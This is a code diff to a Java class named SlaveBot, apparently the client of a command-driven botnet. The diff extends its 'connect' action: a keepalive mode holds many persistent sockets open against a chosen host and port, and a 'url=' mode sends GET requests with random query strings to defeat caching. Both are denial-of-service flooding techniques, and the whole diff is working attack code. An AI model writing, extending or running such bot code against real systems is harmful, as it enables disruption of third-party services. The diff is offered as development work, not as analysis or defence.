@@ -1,4 +1,4 @@
-//package bot;
+package bot;
 
 import java.io.*;
 import java.net.*;
@@ -53,24 +53,19 @@ public class SlaveBot implements Runnable {
 	public static void extractTargetData(String targetData){
 		String delims = " ";
 		StringTokenizer st = new StringTokenizer(targetData, delims);
-
+		Integer numElements = st.countTokens();
 		String action  = (String)st.nextElement();
 		String targetHostName = ((String) st.nextElement());
 		String targetPort = ((String) st.nextElement());
-		String numberOfConn;
-		//= ((String)st.nextElement());
-		if(st.hasMoreTokens())
-		{
-			numberOfConn = ((String)st.nextElement());
-		}
-		else{
-			numberOfConn = null;
-		}
+		String numberOfConn = ((String) st.nextElement());
+		String keepAliveOrUrl = ((String) st.nextElement());
 
-		storeTargetData(action, targetHostName, targetPort, numberOfConn);
+
+
+		storeTargetData(action, targetHostName, targetPort, numberOfConn, keepAliveOrUrl);
 	}
 
-	public static void storeTargetData(String action, String targetHostName, String targetPortNumber, String numberOfConn){
+	public static void storeTargetData(String action, String targetHostName, String targetPortNumber, String numberOfConn, String keepAliveOrUrl){
 
 
 		if (action.contentEquals("connect")){
@@ -88,13 +83,13 @@ public class SlaveBot implements Runnable {
 				targetObj =  targetDataMap.get(uniqueKey);
 			}
 
-			performConnect(targetObj.targetHost, targetObj.port, numberOfConn);
+			performConnect(targetObj.targetHost, targetObj.port, numberOfConn, keepAliveOrUrl);
 		}
 
 
 		else if (action.contentEquals("disconnect")){
 
-			if (targetPortNumber.contentEquals(null)){
+			if (targetPortNumber.equals(null)){
 
 				performDisconnect(targetHostName, null);
 
@@ -136,29 +131,83 @@ public class SlaveBot implements Runnable {
 
 
 
-	public static void performConnect(String ip, String port, String numConnection){
+	public static void performConnect(String ip, String port, String numConnection, String keepAliveOrUrl){
 		String conKey = concatinatedData(ip, port);
 		Integer numConnectionInt = Integer.parseInt(numConnection);
 		Integer portInt = Integer.parseInt(port);
 		targetData obj = targetDataMap.get(conKey);
 
-		//obj.arrSoc = new Socket[numConnectionInt];		
-		if (targetDataMap.containsKey(conKey)){
-			try{
-				for(int i = 0; i < Integer.parseInt(numConnection); i++){
-					Socket socObj = new Socket(ip, portInt);
-					obj.arrSoc.add(socObj);
-					//obj.arrSoc[i] = new Socket(ip, portInt);
-					System.out.println("Connected to the target");
+		//obj.arrSoc = new Socket[numConnectionInt];	
+		if(keepAliveOrUrl.contentEquals("keepalive")){
+			if (targetDataMap.containsKey(conKey)){
+				try{
+					for(int i = 0; i < numConnectionInt; i++){
+						Socket socObj = new Socket(ip, portInt);
+						socObj.setKeepAlive(true);
+						obj.arrSoc.add(socObj);
+						//obj.arrSoc[i] = new Socket(ip, portInt);
+						System.out.println("Connected to the target");
+					}
+					listMap();
 				}
-				listMap();
+				catch(Exception e){
+					System.out.println(e);
+				}
 			}
-			catch(Exception e){
-				System.out.println(e);
+			else{
+				System.out.println("Error Connecting to host");
 			}
+
 		}
-		else{
-			System.out.println("Error Connecting to host");
+		else if(keepAliveOrUrl.startsWith("url=")){
+			String actualUrl = keepAliveOrUrl.replaceAll("url=", "");
+			String toAdd = "/#q=";
+			String halfUrl = actualUrl + toAdd;
+			StringBuilder completeUrl = new StringBuilder(halfUrl);
+			HttpURLConnection connection = null;
+			Random random = new Random();
+			char[] chars = "abcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
+			int  randomNum = random.nextInt(10) + 1;
+			for (int i = 0; i < randomNum; i++) {
+				char toAppend = chars[random.nextInt(chars.length)];
+				completeUrl.append(toAppend);
+			}
+			System.out.println("The url to connect is " + completeUrl);
+			try{
+				String str = completeUrl.toString();
+				URL url = new URL("https://" + str);
+				connection = (HttpURLConnection) url.openConnection();
+				connection.setRequestMethod("GET");
+				int responseCode = connection.getResponseCode();
+				System.out.println("Response Code : " + responseCode);
+				//connection.setRequestProperty("Accept", "application/json");
+
+				if (connection.getResponseCode() != 200) {
+					throw new RuntimeException("Failed : HTTP error code : "
+							+ connection.getResponseCode());
+				}
+
+				BufferedReader br = new BufferedReader(new InputStreamReader(
+					(connection.getInputStream())));
+
+				String output;
+				System.out.println("Output from Server .... \n");
+				while ((output = br.readLine()) != null) {
+					System.out.println(output);
+				}
+
+				connection.disconnect();
+
+			  } catch (MalformedURLException e) {
+
+				e.printStackTrace();
+
+			  } catch (IOException e) {
+
+				e.printStackTrace();
+
+			  }
+
 		}
 
 		//System.out.println("total sockets" + obj.arrSoc.size());
@@ -168,7 +217,7 @@ public class SlaveBot implements Runnable {
 
 	public static void performDisconnect(String ip, String port) {
 
-		if(port.contentEquals(null)){
+		if(port.equals(null)){
 			for (Entry<String, targetData> entry : targetDataMap.entrySet()){
 				if(entry.getKey().startsWith(ip)){
 					targetData newObj = entry.getValue();
